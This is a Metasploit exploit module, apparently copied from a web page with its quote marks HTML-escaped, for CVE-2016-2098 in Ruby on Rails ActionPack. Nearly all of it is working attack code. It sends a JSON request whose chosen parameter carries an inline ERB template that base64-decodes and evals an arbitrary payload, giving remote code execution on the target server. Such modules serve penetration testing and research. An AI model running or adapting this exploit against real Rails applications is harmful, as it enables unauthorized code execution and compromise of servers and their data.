# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ruby on Rails ActionPack Inline ERB Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a remote code execution vulnerability in the
        inline request processor of the Ruby on Rails ActionPack component.
        This vulnerability allows an attacker to process ERB to the inline
        JSON processor, which is then rendered, permitting full RCE within
        the runtime, without logging an error condition.
      },
      &#039;Author&#039;         =>
        [
          &#039;RageLtMan <rageltman[at]sempervictus>&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2016-2098&#039; ]
        ],
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>    [ [&#039;Automatic&#039;, {} ] ],
      &#039;DisclosureDate&#039; => &#039;Mar 1 2016&#039;,
      &#039;DefaultOptions&#039; => {
        "PrependFork" => true
      },
      &#039;DefaultTarget&#039; => 0))
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable Ruby on Rails application&#039;, "/"]),
        OptString.new(&#039;TARGETPARAM&#039;, [ true, &#039;The target parameter to inject with inline code&#039;, &#039;id&#039;])
      ], self.class)
 
  end
 
  def json_request
    code = Rex::Text.encode_base64(payload.encoded)
    return {
      datastore[&#039;TARGETPARAM&#039;] => {"inline" => "<%= eval(%[#{code}].unpack(%[m0])[0]) %>"}
    }.to_json
  end
 
  def exploit
    print_status("Sending inline code to parameter: #{datastore[&#039;TARGETPARAM&#039;]}")
    send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path),
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;ctype&#039;   => &#039;application/json&#039;,
      &#039;headers&#039; => {
        &#039;Accept&#039; => &#039;application/json&#039;
      },
      &#039;data&#039;    => json_request
    }, 25)
  end
end

